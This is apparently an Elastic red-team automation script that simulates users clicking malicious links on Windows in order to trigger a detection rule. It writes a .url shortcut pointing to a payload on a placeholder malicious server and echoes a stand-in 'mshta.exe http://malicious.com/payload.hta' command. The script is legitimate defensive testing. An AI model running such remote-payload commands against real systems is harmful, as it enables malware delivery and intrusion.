# Copyright Elasticsearch B.V. and/or licensed to Elasticsearch B.V. under one
# or more contributor license agreements. Licensed under the Elastic License
# 2.0; you may not use this file except in compliance with the Elastic License
# 2.0.

# Name: User Execution - Malicious Link
# RTA: user_execution_malicious_link.py
# ATT&CK: T1204, T1204.001
# Description: Simulates user execution techniques where a user is tricked into
#              clicking malicious links that lead to payload download and execution.

import logging
from pathlib import Path

from . import OSType, RuleMetadata, _common, register_code_rta

log = logging.getLogger(__name__)


@register_code_rta(
    id="e2f3a4b5-c6d7-8901-f012-456789abcdef",
    name="user_execution_malicious_link",
    platforms=[OSType.WINDOWS],
    endpoint_rules=[
        # Endpoint rule: Potential Execution via LNK Stomping
        RuleMetadata(
            id="27d1b0dc-a50c-4e7b-9ec5-961351fbe819",
            name="Potential Execution via LNK Stomping",
        ),
    ],
    siem_rules=[],
    techniques=["T1204", "T1204.001"],
)
def main():
    """
    Simulates user execution via malicious links.

    This RTA demonstrates patterns associated with users clicking malicious links
    that lead to payload download and execution.
    """
    log.info("Simulating user execution via malicious link patterns")
    powershell = "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"

    # Simulate URL file creation (malicious internet shortcut)
    log.info("Simulating malicious URL file creation")
    url_file = Path("C:\\Users\\Public\\Downloads\\click_here.url")
    url_content = (
        "[InternetShortcut]\r\n"
        "URL=file://malicious-server/share/payload.exe\r\n"
    )
    _common.create_file_with_data(str(url_file), url_content)

    # Simulate browser spawning suspicious child process
    log.info("Simulating browser spawning command interpreter")
    _ = _common.execute_command(
        [powershell, "-Command", "echo", "'iexplore.exe spawning cmd.exe'"],
        timeout_secs=10,
    )

    # Simulate mshta execution from URL
    log.info("Simulating mshta URL execution pattern")
    _ = _common.execute_command(
        [powershell, "-Command", "echo", "'mshta.exe http://malicious.com/payload.hta'"],
        timeout_secs=10,
    )

    # Cleanup
    log.info("Cleaning up simulation files")
    _common.remove_file(str(url_file))

    log.info("User execution malicious link simulation completed")
